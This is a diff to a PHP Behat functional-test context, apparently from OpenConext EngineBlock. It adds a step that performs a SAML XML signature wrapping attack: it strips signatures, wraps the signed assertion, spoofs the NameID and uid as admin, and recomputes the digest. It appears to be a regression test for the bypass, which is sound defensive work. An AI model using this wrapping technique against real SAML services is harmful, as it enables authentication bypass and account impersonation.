@@ -22,6 +22,7 @@ use Behat\Gherkin\Node\TableNode;
 use Behat\Mink\Exception\ElementNotFoundException;
 use Behat\Mink\Exception\ExpectationException;
 use DOMDocument;
+use DOMElement;
 use DOMXPath;
 use Ingenerator\BehatTableAssert\AssertTable;
 use Ingenerator\BehatTableAssert\TableParser\HTMLTable;
@@ -33,7 +34,11 @@ use OpenConext\EngineBlockFunctionalTestingBundle\Fixtures\ServiceRegistryFixtur
 use OpenConext\EngineBlockFunctionalTestingBundle\Mock\EntityRegistry;
 use OpenConext\EngineBlockFunctionalTestingBundle\Mock\MockIdentityProvider;
 use OpenConext\EngineBlockFunctionalTestingBundle\Service\EngineBlock;
+use RobRichards\XMLSecLibs\XMLSecEnc;
+use RobRichards\XMLSecLibs\XMLSecurityDSig;
 use RuntimeException;
+use SAML2\Constants;
+use SAML2\DOMDocumentFactory;
 
 /**
  * @SuppressWarnings(PHPMD.TooManyPublicMethods) Both set up and tasks can be a lot...
@@ -751,5 +756,119 @@ HTML;
             }
         }
         throw new RuntimeException('Unable to find the request id on the page');
+    }
+
+    /**
+     * @Then /^I exploit the XML signature bypass vulnerability after passing through the IdP$/
+     */
+    public function iExploitTheXMLSignatureBypass()
+    {
+        $mink = $this->getMinkContext();
+
+        // Get SAMLResponse from form
+        $result = $mink->getSession()->getPage()->find('xpath', '//form/input[@name="SAMLResponse"]');
+        $samlResponse = $result->getAttribute('value');
+
+        // Convert response to  DOMDocument
+        $samlResponseXml = base64_decode($samlResponse);
+        $xmlDom = DOMDocumentFactory::fromString($samlResponseXml);
+
+        // Init XPath and register namespaces
+        $xpath = new DOMXPath($xmlDom);
+        $xpath->registerNamespace('soap-env', Constants::NS_SOAP);
+        $xpath->registerNamespace('saml_protocol', Constants::NS_SAMLP);
+        $xpath->registerNamespace('saml_assertion', Constants::NS_SAML);
+        $xpath->registerNamespace('saml_metadata', Constants::NS_MD);
+        $xpath->registerNamespace('ds', XMLSecurityDSig::XMLDSIGNS);
+        $xpath->registerNamespace('xenc', XMLSecEnc::XMLENCNS);
+
+        // Strip response/signature
+        $nodes = $xpath->query("/saml_protocol:Response/ds:Signature");
+        foreach ($nodes as $node) {
+            $node->parentNode->removeChild($node);
+        }
+
+        // Get elements
+        $response = $xpath->query("/saml_protocol:Response")->item(0);
+        $assertion = $xpath->query("/saml_protocol:Response/saml_assertion:Assertion")->item(0);
+        $signature = $xpath->query("/saml_protocol:Response/saml_assertion:Assertion/ds:Signature")->item(0);
+
+        // 1. Clone original assertion
+        $originalAssertion = $assertion->cloneNode(true);
+
+        // 2. Put original assertion into wrapper
+        $wrapper = $xmlDom->createElement('wrapper');
+        $wrapper->appendChild($originalAssertion);
+        $response->appendChild($wrapper);
+
+        // 3. Remove Signature from Assertions
+        $assertion->removeChild($signature);
+        $signature = $xpath->query("./ds:Signature", $originalAssertion)->item(0);
+        $originalAssertion->removeChild($signature);
+
+        // 4. Spoof assertion and change NameID and attribute
+        $nodes = $xpath->query(
+            "/saml_protocol:Response/saml_assertion:Assertion/saml_assertion:Subject/saml_assertion:NameID"
+        );
+        $nodes->item(0)->textContent = "admin";
+
+        $nodes = $xpath->query(
+            '//saml_protocol:Response/saml_assertion:Assertion/saml_assertion:AttributeStatement/'.
+            'saml_assertion:Attribute[@Name="urn:mace:dir:attribute-def:uid"]/saml_assertion:AttributeValue'
+        );
+        $nodes->item(0)->textContent = "ADMIN!";
+
+        // 5. Change original assertion ID
+        $assertion->attributes->getNamedItem('ID')->nodeValue = 'attack';
+
+        // 6. Compute new digest over assertion
+        $digestValue = $this->calculateDigest($assertion);
+        $assertion->appendChild($signature);
+
+        // 7. Create SignedInfo with digest and update Reference
+        $signedInfo = $xpath->query(
+            "/saml_protocol:Response/saml_assertion:Assertion/ds:Signature/ds:SignedInfo"
+        )->item(0);
+        $newSignedInfo = $signedInfo->cloneNode(true);
+        $reference = $xpath->query("./ds:Reference", $newSignedInfo)->item(0);
+        $reference->attributes->getNamedItem('URI')->nodeValue = '#attack';
+
+        $digest = $xpath->query("./ds:DigestValue", $reference)->item(0);
+        $digest->nodeValue = $digestValue;
+
+        // 8. Add SignedInfo to signature
+        $signature->appendChild($newSignedInfo);
+        $assertion->insertBefore($signature, $assertion->firstChild);
+
+        $mutatedResponse = $xmlDom->saveXML();
+
+        // Update form with mutated SAMLResponse
+        $samlResponse = base64_encode($mutatedResponse);
+        $result->setValue($samlResponse);
+
+        $mink->pressButton('GO');
+    }
+
+    /**
+     * @param DOMElement $element
+     * @return string
+     */
+    private function calculateDigest(DOMElement $element)
+    {
+        $xml = $element->C14N(true, false);
+        $digest = $this->digest($xml);
+
+        return $digest;
+    }
+
+    /**
+     * @param $data string
+     * @return string
+     */
+    private function digest($data)
+    {
+        $digest = hash('sha256', $data, true);
+        $digest = base64_encode($digest);
+        return $digest;
     }
 }
